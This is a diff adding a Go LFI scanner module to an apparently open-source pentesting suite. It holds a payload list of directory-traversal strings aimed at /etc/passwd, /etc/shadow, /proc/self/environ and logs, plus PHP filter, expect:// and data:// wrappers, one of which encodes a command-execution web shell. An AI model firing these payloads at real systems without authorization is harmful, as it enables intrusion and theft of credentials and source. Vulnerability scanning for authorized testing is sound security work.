@@ -1,0 +1,339 @@
+/*
+·━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━·
+:                                                                               :
+:   █▀ █ █▀▀   ·   Blazing-fast pentesting suite                                :
+:   ▄█ █ █▀    ·   BSD 3-Clause License                                         :
+:                                                                               :
+:   (c) 2022-2026 vmfunc, xyzeva,                                               :
+:                 lunchcat alumni & contributors                                :
+:                                                                               :
+·━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━·
+*/
+
+package scan
+
+import (
+	"context"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"regexp"
+	"strings"
+	"sync"
+	"time"
+
+	charmlog "github.com/charmbracelet/log"
+	"github.com/vmfunc/sif/internal/httpx"
+	"github.com/vmfunc/sif/internal/logger"
+	"github.com/vmfunc/sif/internal/output"
+)
+
+// LFIResult represents the results of LFI reconnaissance
+type LFIResult struct {
+	Vulnerabilities []LFIVulnerability `json:"vulnerabilities,omitempty"`
+	TestedParams    int                `json:"tested_params"`
+	TestedPayloads  int                `json:"tested_payloads"`
+}
+
+// LFIVulnerability represents a detected LFI vulnerability
+type LFIVulnerability struct {
+	URL          string `json:"url"`
+	Parameter    string `json:"parameter"`
+	Payload      string `json:"payload"`
+	Evidence     string `json:"evidence"`
+	Severity     string `json:"severity"`
+	FileIncluded string `json:"file_included,omitempty"`
+}
+
+// LFI payloads for directory traversal
+var lfiPayloads = []struct {
+	payload  string
+	target   string
+	severity string
+}{
+	// Linux/Unix paths
+	{"../../../../../../../etc/passwd", "/etc/passwd", "high"},
+	{"....//....//....//....//....//etc/passwd", "/etc/passwd", "high"},
+	{"..%2f..%2f..%2f..%2f..%2fetc/passwd", "/etc/passwd", "high"},
+	{"..%252f..%252f..%252f..%252fetc/passwd", "/etc/passwd", "high"},
+	{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd", "high"},
+	{"....\\....\\....\\....\\etc\\passwd", "/etc/passwd", "high"},
+	{"/etc/passwd", "/etc/passwd", "high"},
+	{"/etc/passwd%00", "/etc/passwd", "high"},
+	{"../../../../../../../etc/shadow", "/etc/shadow", "critical"},
+	{"../../../../../../../proc/self/environ", "/proc/self/environ", "high"},
+	{"../../../../../../../var/log/apache2/access.log", "apache access log", "medium"},
+	{"../../../../../../../var/log/apache2/error.log", "apache error log", "medium"},
+	{"../../../../../../../var/log/nginx/access.log", "nginx access log", "medium"},
+	{"../../../../../../../var/log/nginx/error.log", "nginx error log", "medium"},
+
+	// Windows paths
+	{"..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows hosts", "high"},
+	{"../../../../../../../windows/system32/drivers/etc/hosts", "windows hosts", "high"},
+	{"..\\..\\..\\..\\boot.ini", "boot.ini", "high"},
+	{"../../../../../../../boot.ini", "boot.ini", "high"},
+	{"..\\..\\..\\..\\windows\\win.ini", "win.ini", "medium"},
+
+	// PHP wrappers
+	{"php://filter/convert.base64-encode/resource=index.php", "php source", "high"},
+	{"php://filter/read=convert.base64-encode/resource=config.php", "php config", "critical"},
+	{"expect://id", "command execution", "critical"},
+	{"php://input", "php input", "high"},
+	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "data wrapper", "critical"},
+}
+
+// Evidence patterns for LFI detection
+var lfiEvidencePatterns = []struct {
+	pattern     *regexp.Regexp
+	description string
+	severity    string
+}{
+	{regexp.MustCompile(`root:.*:0:0:`), "/etc/passwd content", "high"},
+	{regexp.MustCompile(`daemon:.*:1:1:`), "/etc/passwd content", "high"},
+	{regexp.MustCompile(`nobody:.*:65534:`), "/etc/passwd content", "high"},
+	{regexp.MustCompile(`\[boot loader\]`), "boot.ini content", "high"},
+	{regexp.MustCompile(`\[operating systems\]`), "boot.ini content", "high"},
+	{regexp.MustCompile(`; for 16-bit app support`), "win.ini content", "medium"},
+	{regexp.MustCompile(`\[fonts\]`), "win.ini content", "medium"},
+	{regexp.MustCompile(`127\.0\.0\.1\s+localhost`), "hosts file content", "medium"},
+	{regexp.MustCompile(`DOCUMENT_ROOT=`), "/proc/self/environ content", "high"},
+	{regexp.MustCompile(`PATH=.*:/usr`), "environment variables", "high"},
+	{regexp.MustCompile(`<\?php`), "PHP source code", "high"},
+	{regexp.MustCompile(`PD9waHA`), "base64 encoded PHP", "high"},
+}
+
+// Common parameters to test
+var commonLFIParams = []string{
+	"file", "page", "path", "include", "doc", "document",
+	"folder", "root", "pg", "style", "pdf", "template",
+	"php_path", "lang", "language", "view", "content",
+	"layout", "mod", "conf", "url", "dir", "show",
+	"name", "cat", "action", "read", "load", "open",
+}
+
+// LFI performs LFI (Local File Inclusion) reconnaissance on the target URL
+func LFI(targetURL string, timeout time.Duration, threads int, logdir string) (*LFIResult, error) {
+	log := output.Module("LFI")
+	log.Start()
+
+	spin := output.NewSpinner("Scanning for LFI vulnerabilities")
+	spin.Start()
+
+	sanitizedURL := stripScheme(targetURL)
+
+	if logdir != "" {
+		if err := logger.WriteHeader(sanitizedURL, logdir, "LFI reconnaissance"); err != nil {
+			spin.Stop()
+			log.Error("Error creating log file: %v", err)
+			return nil, err
+		}
+	}
+
+	result := &LFIResult{
+		Vulnerabilities: make([]LFIVulnerability, 0, 16),
+	}
+	seen := make(map[string]bool)
+
+	var mu sync.Mutex
+	var wg sync.WaitGroup
+
+	client := httpx.Client(timeout)
+	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		if len(via) >= 3 {
+			return http.ErrUseLastResponse
+		}
+		return nil
+	}
+
+	// parse the target URL to check for existing parameters
+	parsedURL, err := url.Parse(targetURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to parse URL: %w", err)
+	}
+
+	existingParams := parsedURL.Query()
+	paramsToTest := make(map[string]bool)
+
+	// add existing parameters
+	for param := range existingParams {
+		paramsToTest[param] = true
+	}
+
+	// add common LFI parameters
+	for _, param := range commonLFIParams {
+		paramsToTest[param] = true
+	}
+
+	result.TestedParams = len(paramsToTest)
+	result.TestedPayloads = len(lfiPayloads)
+
+	log.Info("Testing %d parameters with %d payloads", len(paramsToTest), len(lfiPayloads))
+
+	// baseline the unmodified target so evidence-like content already present
+	// on every response (a blog post about /etc/passwd, a "<?php" snippet) isn't
+	// reported as an LFI hit for every param/payload combination.
+	baselineEvidence := make(map[string]bool)
+	if baseReq, err := http.NewRequestWithContext(context.TODO(), http.MethodGet, targetURL, http.NoBody); err == nil {
+		if baseResp, err := client.Do(baseReq); err == nil {
+			baseBody, err := io.ReadAll(io.LimitReader(baseResp.Body, 1024*100))
+			baseResp.Body.Close()
+			if err == nil {
+				baseBodyStr := string(baseBody)
+				for _, evidence := range lfiEvidencePatterns {
+					if evidence.pattern.MatchString(baseBodyStr) {
+						baselineEvidence[evidence.description] = true
+					}
+				}
+			}
+		}
+	}
+
+	// create work items
+	type workItem struct {
+		param   string
+		payload struct {
+			payload  string
+			target   string
+			severity string
+		}
+	}
+
+	workItems := make([]workItem, 0, len(paramsToTest)*len(lfiPayloads))
+	for param := range paramsToTest {
+		for _, payload := range lfiPayloads {
+			workItems = append(workItems, workItem{param: param, payload: payload})
+		}
+	}
+
+	// distribute work
+	workChan := make(chan workItem, len(workItems))
+	for _, item := range workItems {
+		workChan <- item
+	}
+	close(workChan)
+
+	wg.Add(threads)
+	for t := 0; t < threads; t++ {
+		go func() {
+			defer wg.Done()
+			for item := range workChan {
+				// build test URL
+				testParams := url.Values{}
+				for k, v := range existingParams {
+					if k != item.param {
+						testParams[k] = v
+					}
+				}
+				testParams.Set(item.param, item.payload.payload)
+
+				testURL := fmt.Sprintf("%s://%s%s?%s",
+					parsedURL.Scheme,
+					parsedURL.Host,
+					parsedURL.Path,
+					testParams.Encode())
+
+				req, err := http.NewRequestWithContext(context.TODO(), http.MethodGet, testURL, http.NoBody)
+				if err != nil {
+					charmlog.Debugf("Error creating request for %s: %v", testURL, err)
+					continue
+				}
+				resp, err := client.Do(req)
+				if err != nil {
+					charmlog.Debugf("Error testing %s: %v", testURL, err)
+					continue
+				}
+
+				body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*100))
+				resp.Body.Close()
+				if err != nil {
+					continue
+				}
+
+				bodyStr := string(body)
+
+				// check for evidence patterns
+				for _, evidence := range lfiEvidencePatterns {
+					match := evidence.pattern.FindString(bodyStr)
+					// our own payload echoed back isn't proof of inclusion, and
+					// evidence already present in the unmodified baseline means
+					// the content is static, not caused by this payload
+					if match != "" && !strings.Contains(item.payload.payload, match) && !baselineEvidence[evidence.description] {
+						key := item.param + "|" + item.payload.payload
+						mu.Lock()
+						if seen[key] {
+							mu.Unlock()
+							break
+						}
+						seen[key] = true
+
+						vuln := LFIVulnerability{
+							URL:          testURL,
+							Parameter:    item.param,
+							Payload:      item.payload.payload,
+							Evidence:     evidence.description,
+							Severity:     item.payload.severity,
+							FileIncluded: item.payload.target,
+						}
+						result.Vulnerabilities = append(result.Vulnerabilities, vuln)
+						mu.Unlock()
+
+						spin.Stop()
+						log.Warn("LFI vulnerability found: %s in param %s - %s",
+							output.SeverityHigh.Render(evidence.description),
+							output.Highlight.Render(item.param),
+							output.Status.Render(item.payload.target))
+						spin.Start()
+
+						if logdir != "" {
+							logger.Write(sanitizedURL, logdir,
+								fmt.Sprintf("LFI: %s in param [%s] via payload [%s]\n",
+									evidence.description, item.param, item.payload.payload))
+						}
+						break
+					}
+				}
+			}
+		}()
+	}
+	wg.Wait()
+
+	spin.Stop()
+
+	// summary
+	if len(result.Vulnerabilities) > 0 {
+		log.Warn("Found %d LFI vulnerabilities", len(result.Vulnerabilities))
+		criticalCount := 0
+		highCount := 0
+		for _, v := range result.Vulnerabilities {
+			if v.Severity == "critical" {
+				criticalCount++
+			} else if v.Severity == "high" {
+				highCount++
+			}
+		}
+		if criticalCount > 0 {
+			log.Error("%d CRITICAL vulnerabilities found!", criticalCount)
+		}
+		if highCount > 0 {
+			log.Warn("%d HIGH severity vulnerabilities found", highCount)
+		}
+		log.Complete(len(result.Vulnerabilities), "found")
+	} else {
+		log.Info("No LFI vulnerabilities detected")
+		log.Complete(0, "found")
+		return nil, nil //nolint:nilnil // no LFI found is not an error
+	}
+
+	return result, nil
+}
+
+// DetectLFIFromResponse checks a response body for LFI evidence
+func DetectLFIFromResponse(body string) (bool, string) {
+	for _, evidence := range lfiEvidencePatterns {
+		if evidence.pattern.MatchString(body) {
+			return true, evidence.description
+		}
+	}
+	return false, ""
+}
